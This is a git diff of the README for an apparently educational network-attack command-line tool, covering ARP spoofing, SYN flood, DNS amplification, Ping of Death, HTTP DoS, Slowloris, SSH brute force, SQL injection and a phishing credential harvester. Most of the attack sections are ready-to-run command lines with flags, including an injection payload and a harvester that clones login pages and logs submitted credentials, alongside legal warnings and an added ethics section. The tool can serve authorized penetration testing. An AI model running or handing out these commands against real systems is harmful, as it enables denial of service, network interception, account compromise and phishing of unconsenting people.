@@ -14,42 +14,30 @@ This tool is for **EDUCATIONAL AND TESTING PURPOSES ONLY**. Users must:
 Improper use of this tool may be illegal and result in criminal charges.
 
 ## Table of Contents
-
-- [Legal Warning](#legal-warning-)
-- [Overview](#overview)
-  - [Installation](#installation)
-  - [Basic Usage](#basic-usage)
-  - [Attack Workflow](#attack-workflow)
-- [Best Practices](#best-practices)
-  - [Environment Setup](#environment-setup)
-  - [Attack Execution](#attack-execution)
-  - [Safety Measures](#safety-measures)
-- [Attack Types](#attack-types)
-  - [Network-Layer Attacks](#network-layer-attacks)
-    - [ARP Spoofing](#arp-spoofing)
-    - [SYN Flood](#syn-flood)
-  - [Application-Layer Attacks](#application-layer-attacks)
-    - [HTTP DoS](#http-dos)
-    - [Slowloris](#slowloris)
-  - [Amplification Attacks](#amplification-attacks)
-    - [DNS Amplification](#dns-amplification)
-  - [Credential Attacks](#credential-attacks)
-    - [SSH Brute Force](#ssh-brute-force)
-    - [SQL Injection](#sql-injection)
-  - [Traffic Replay](#traffic-replay)
-- [Troubleshooting](#troubleshooting)
-- [License](#license)
-- [Contact](#contact)
-
-## Overview
+- [Legal Warning ⚠️](#legal-warning-)
+- [Table of Contents](#table-of-contents)
 - [Prerequisites](#prerequisites)
 - [Installation](#installation)
 - [Basic Usage](#basic-usage)
-- [PCAP Replay Attacks](#pcap-replay-attacks)
-- [Network Attack Simulations](#network-attack-simulations)
-- [Web Attack Simulations](#web-attack-simulations)
-- [Best Practices](#best-practices)
+- [Understanding Attack Types](#understanding-attack-types)
+  - [Attack Flow Overview](#attack-flow-overview)
+- [Attack Types](#attack-types)
+  - [Network-Layer Attacks](#network-layer-attacks)
+    - [ARP Spoofing](#arp-spoofing)
+    - [SYN Flood](#syn-flood-attack)
+    - [DNS Amplification](#dns-amplification-attack)
+    - [Ping of Death](#ping-of-death-attack)
+  - [Application-Layer Attacks](#application-layer-attacks)
+    - [HTTP DoS](#http-dos-attack)
+    - [Slowloris](#slowloris-attack)
+    - [SSH Brute Force](#ssh-brute-force-attack)
+    - [SQL Injection](#sql-injection-attack)
+    - [Credential Harvester](#credential-harvester-attack)
+  - [PCAP Replay Attacks](#pcap-replay-attacks)
+- [Ethical Considerations](#ethical-considerations)
 - [Troubleshooting](#troubleshooting)
+- [License](#license)
+- [Contact](#contact)
 
 ## Prerequisites
 
@@ -552,6 +540,182 @@ python src/cli.py dns-amplification \
 - Use appropriate intervals between queries
 - Regularly update DNS server list
 
+### Network-Layer Attacks
+
+#### Ping of Death
+
+**Description:**  
+Ping of Death (PoD) is a denial of service attack that sends oversized or malformed ICMP echo request (ping) packets to a target system. When these packets are fragmented and reassembled at the target, they can cause buffer overflows and system crashes in vulnerable systems.
+
+**Attack Flow:**
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant T as Target
+    Note over A: Generate Oversized Packet
+    A->>T: Fragment 1 (ICMP Echo Request)
+    A->>T: Fragment 2
+    A->>T: Fragment N
+    Note over T: Buffer Overflow on Reassembly
+    Note over T: System Crash
+```
+
+**Key Features:**
+- Oversized packet generation
+- IP fragmentation handling
+- Custom packet size control
+- Multiple target support
+- Response monitoring
+- System impact analysis
+
+**Parameters:**
+- `--target`: Target IP address
+- `--targets-file`: File containing multiple targets
+- `--size`: Packet size (bytes)
+- `--count`: Number of packets to send
+- `--interval`: Delay between packets
+- `--fragment-size`: Size of IP fragments
+- `--interface`: Network interface to use
+- `--verify`: Test for vulnerability
+- `--timeout`: Response timeout
+
+**Example Usage:**
+```bash
+# Basic Ping of Death - Single target
+python src/cli.py ping-of-death \
+    --target 192.168.1.100 \
+    --size 65500
+
+# Advanced Ping of Death - Multiple targets
+python src/cli.py ping-of-death \
+    --targets-file targets.txt \
+    --size 65500 \
+    --count 100 \
+    --interval 0.1 \
+    --fragment-size 1024 \
+    --verify \
+    --timeout 2
+```
+
+**Attack Scenarios:**
+1. Basic System Testing
+   ```bash
+   # Test single system for vulnerability
+   python src/cli.py ping-of-death \
+       --target 192.168.1.100 \
+       --size 65500 \
+       --count 1 \
+       --verify
+   ```
+
+2. Network Stress Test
+   ```bash
+   # Test multiple systems with varied packet sizes
+   python src/cli.py ping-of-death \
+       --targets-file network_hosts.txt \
+       --size 65500 \
+       --count 50 \
+       --interval 0.5 \
+       --fragment-size 1500
+   ```
+
+**Safety Considerations:**
+- Test on isolated systems first
+- Monitor target system stability
+- Start with minimal packet sizes
+- Use appropriate intervals
+- Have system recovery procedures ready
+- Document all testing activities
+
+### Application-Layer Attacks
+
+#### Credential Harvester
+
+**Description:**  
+The Credential Harvester creates convincing phishing pages by cloning legitimate login forms and collecting submitted credentials. This tool helps security teams test user awareness and validate security controls against phishing attacks.
+
+**Attack Flow:**
+```mermaid
+graph TB
+    Start[Start Server] --> Clone[Clone Target Site]
+    Clone --> Customize[Customize Forms]
+    Customize --> Listen[Listen for Connections]
+    Listen --> Process{Process Request}
+    Process -->|Valid Form| Collect[Collect Credentials]
+    Process -->|Other| Redirect[Redirect to Real Site]
+    Collect --> Log[Log Data]
+    Collect --> Redirect
+```
+
+**Key Features:**
+- Website cloning
+- Form customization
+- SSL/TLS support
+- Real-time monitoring
+- Credential logging
+- Traffic analysis
+- Multiple template support
+
+**Parameters:**
+- `--template`: Predefined template to use
+- `--target-url`: URL to clone
+- `--custom-form`: Path to custom form HTML
+- `--port`: Port to listen on
+- `--ssl`: Enable HTTPS
+- `--cert`: SSL certificate file
+- `--key`: SSL private key file
+- `--redirect`: URL to redirect after submission
+- `--log-file`: File to save captured data
+
+**Example Usage:**
+```bash
+# Basic harvester with default template
+python src/cli.py credential-harvester \
+    --template login-form \
+    --port 80
+
+# Advanced harvester with SSL
+python src/cli.py credential-harvester \
+    --target-url https://example.com/login \
+    --port 443 \
+    --ssl \
+    --cert cert.pem \
+    --key key.pem \
+    --redirect https://real-site.com \
+    --log-file harvest.json
+```
+
+**Attack Scenarios:**
+1. Basic Awareness Testing
+   ```bash
+   # Simple login page clone
+   python src/cli.py credential-harvester \
+       --template corporate-login \
+       --port 8080 \
+       --redirect https://company.com
+   ```
+
+2. Advanced Phishing Simulation
+   ```bash
+   # Custom form with SSL and logging
+   python src/cli.py credential-harvester \
+       --custom-form templates/custom.html \
+       --port 443 \
+       --ssl \
+       --cert company.crt \
+       --key company.key \
+       --redirect https://company.com \
+       --log-file phish_test.json
+   ```
+
+**Safety Considerations:**
+- Use only in authorized testing
+- Handle captured data securely
+- Delete sensitive data after testing
+- Monitor for unauthorized access
+- Document all test activities
+- Inform relevant security teams
+
 ### Credential Attacks
 
 #### SSH Brute Force
@@ -840,288 +1004,83 @@ python src/cli.py pcap-replay \
 - Monitor system resources
 - Keep replay logs for analysis
 
-## PCAP Replay Attacks
-```bash
-# Basic ARP spoofing
-python src/cli.py arp-spoof \
-    --target 192.168.1.100 \
-    --gateway 192.168.1.1 \
-    --interface eth0
+## Ethical Considerations
 
-# Advanced ARP spoofing with full control
-python src/cli.py arp-spoof \
-    --target 192.168.1.100 \
-    --target-mac 00:11:22:33:44:55 \
-    --gateway 192.168.1.1 \
-    --interface eth0 \
-    --bidirectional \
-    --aggressive \
-    --restore-on-exit \
-    --packet-log /path/to/log.pcap \
-    --verify
-```
+### Professional Ethics
 
-#### SYN Flood Examples
-```bash
-# Basic SYN flood
-python src/cli.py syn-flood \
-    --target 192.168.1.100 \
-    --port 80 \
-    --threads 4
+1. **Authorization**
+   - Obtain explicit written permission before testing
+   - Document scope and limitations of authorization
+   - Respect boundaries of testing agreements
+   - Report findings responsibly to stakeholders
 
-# Advanced SYN flood
-python src/cli.py syn-flood \
-    --target 192.168.1.100 \
-    --port-range 80-85 \
-    --interface eth0 \
-    --source-ip random \
-    --randomize-source \
-    --payload-size 100 \
-    --window-size 16384 \
-    --flags "SA" \
-    --packet-log /path/to/log.pcap
-```
+2. **Responsible Testing**
+   - Use only in controlled environments
+   - Minimize impact on production systems
+   - Avoid collateral damage to other services
+   - Follow the principle of least privilege
 
-### Amplification Attack Examples
+3. **Data Protection**
+   - Protect sensitive information discovered during testing
+   - Handle credentials and tokens securely
+   - Encrypt and secure test results
+   - Delete sensitive data after testing
 
-#### DNS Amplification Examples
-```bash
-# Basic DNS amplification
-python src/cli.py dns-amplification \
-    --target 192.168.1.100 \
-    --dns-server 8.8.8.8 \
-    --query-domain example.com
+### Legal Compliance
 
-# Advanced DNS amplification with multiple servers
-python src/cli.py dns-amplification \
-    --target 192.168.1.100 \
-    --dns-servers-file dns_servers.txt \
-    --query-domain example.com \
-    --query-type ANY \
-    --recursive \
-    --rotate-dns \
-    --verify-amplification \
-    --amplification-threshold 10.0
-```
+1. **Regulatory Requirements**
+   - Comply with local cybersecurity laws
+   - Follow data protection regulations (GDPR, etc.)
+   - Maintain proper documentation for compliance
+   - Understand jurisdiction-specific restrictions
 
-### Application-Layer Attack Examples
+2. **Industry Standards**
+   - Follow security testing frameworks
+   - Adhere to professional certifications requirements
+   - Maintain industry-standard documentation
+   - Use approved testing methodologies
 
-#### HTTP DoS Examples
-```bash
-# Basic HTTP DoS
-python src/cli.py http-dos \
-    --target http://example.com \
-    --threads 10
+### Responsible Disclosure
 
-# Advanced HTTP DoS
-python src/cli.py http-dos \
-    --target http://example.com \
-    --method POST \
-    --path /api/endpoint \
-    --headers '{"X-Custom": "value"}' \
-    --cookies '{"session": "abc123"}' \
-    --data '{"key": "value"}' \
-    --random-path \
-    --random-query \
-    --ramp-up 30 \
-    --verify-success \
-    --log-file /path/to/log.txt
-```
+1. **Vulnerability Reporting**
+   - Follow responsible disclosure policies
+   - Give organizations time to fix issues
+   - Provide clear documentation of findings
+   - Maintain confidentiality during disclosure
 
-### Slowloris Attack
-```bash
-# Basic Slowloris
-python src/cli.py slowloris \
-    --target example.com \
-    --port 80 \
-    --connections 150
+2. **Communication**
+   - Use appropriate channels for reporting
+   - Document findings professionally
+   - Provide remediation recommendations
+   - Follow up on reported issues
 
-# Advanced Slowloris
-python src/cli.py slowloris \
-    --target example.com \
-    --port 80 \
-    --connections 200 \
-    --ssl \
-    --keep-alive \
-    --header-size 15 \
-    --random-interval \
-    --random-header \
-    --verify-vuln \
-    --log-file /path/to/log.txt
-```
+### Risk Management
 
-### SQL Injection Attack
-```bash
-# Basic SQL injection
-python src/cli.py sql-injection \
-    --target http://example.com/page.php \
-    --parameter id \
-    --payload "1' OR '1'='1"
+1. **Impact Assessment**
+   - Evaluate potential system impact
+   - Consider business continuity
+   - Assess network stability risks
+   - Plan for incident response
 
-# Advanced SQL injection
-python src/cli.py sql-injection \
-    --target http://example.com/page.php \
-    --parameter id \
-    --parameters-file params.txt \
-    --dbms mysql \
-    --prefix "'" \
-    --suffix "-- -" \
-    --encoding base64 \
-    --risk 2 \
-    --level 3 \
-    --test-forms \
-    --test-cookies \
-    --report-format html \
-    --output-dir /path/to/reports
-```
-
-### Credential Attack Examples
-
-#### SSH Brute Force Examples
-```bash
-# Basic SSH brute force
-python src/cli.py ssh-brute-force \
-    --target 192.168.1.100 \
-    --username admin \
-    --wordlist passwords.txt
-
-# Advanced SSH brute force with multiple targets
-python src/cli.py ssh-brute-force \
-    --target 192.168.1.100 \
-    --targets-file targets.txt \
-    --usernames-file users.txt \
-    --passwords-file passwords.txt \
-    --threads 4 \
-    --delay 1.0 \
-    --max-attempts 100 \
-    --stop-on-success \
-    --verify-access \
-    --output-format json \
-    --save-valid creds.json
-```
-
-### Ping of Death Attack
-```bash
-# Basic Ping of Death
-python src/cli.py ping-of-death \
-    --target 192.168.1.100
-
-# Advanced Ping of Death
-python src/cli.py ping-of-death \
-    --target 192.168.1.100 \
-    --size 65500 \
-    --count 100 \
-    --interval 0.1 \
-    --interface eth0 \
-    --verify \
-    --packet-log /path/to/log.pcap
-```
-
-#### Credential Harvester Examples
-```bash
-# Basic credential harvesting
-python src/cli.py credential-harvester \
-    --template login-form \
-    --port 80
-
-# Advanced credential harvesting with SSL
-python src/cli.py credential-harvester \
-    --template custom \
-    --template-dir /path/to/templates \
-    --port 443 \
-    --ssl \
-    --cert cert.pem \
-    --key key.pem \
-    --redirect-url https://legitimate-site.com \
-    --log-file /path/to/harvested.txt
-```
-
-## Best Practices
-
-### Environment Setup
-
-1. **Testing Environment**
-   - Use isolated, controlled environments only
-   - Deploy virtual machines or containers for targets
-   - Set up network monitoring tools
-   - Create backup of systems before testing
-   - Document initial system state
-
-2. **Network Configuration**
-   - Configure interfaces in promiscuous mode when needed
-   - Set up proper network isolation
-   - Use dedicated test networks
-   - Monitor bandwidth and resource usage
-   - Keep logs of all network changes
-
-### Attack Execution
-
-1. **Parameter Selection**
-   - Start with minimal impact settings
-   - Gradually increase intensity
-   - Monitor target responses
-   - Document threshold values
-   - Use appropriate delays
-
-2. **Monitoring & Logging**
-   - Enable comprehensive logging
-   - Monitor system resources
-   - Track network performance
-   - Save attack results
-   - Analyze effectiveness
-
-### Safety Measures
-
-1. **Attack Control**
-   - Use `--verify` flags when available
-   - Enable `--restore-on-exit` for stateful attacks
-   - Set appropriate timeouts
-   - Implement kill switches
+2. **Mitigation Strategies**
+   - Have rollback procedures ready
+   - Maintain system backups
    - Monitor for unintended effects
+   - Document all testing activities
 
-2. **Resource Protection**
-   - Set rate limits
-   - Monitor system load
-   - Implement safeguards
-   - Use resource quotas
-   - Regular status checks
+### Professional Development
 
-## Troubleshooting
+1. **Skill Enhancement**
+   - Stay updated with security trends
+   - Learn about new attack vectors
+   - Understand defense mechanisms
+   - Practice responsible testing
 
-### Common Issues
-
-1. Permission Errors
-```bash
-# Run with sudo for attacks requiring raw socket access
-sudo python src/cli.py arp-spoof ...
-```
-
-2. Interface Issues
-```bash
-# Set interface to promiscuous mode
-sudo ip link set eth0 promisc on
-```
-
-3. Rate Limiting
-```bash
-# Adjust timing parameters
---delay 0.1 --interval 1.0
-```
-
-4. Resource Exhaustion
-```bash
-# Reduce thread count or connection count
---threads 4 --connections 100
-```
-
-### Debug Mode
-```bash
-# Enable verbose output
-python src/cli.py <attack-type> --verbose
-
-# Save debug logs
-python src/cli.py <attack-type> --log-file debug.log --verbose
-```
+2. **Knowledge Sharing**
+   - Contribute to security community
+   - Share lessons learned
+   - Help improve security tools
+   - Mentor others in ethical testing
 
 ## Safety Warning
 
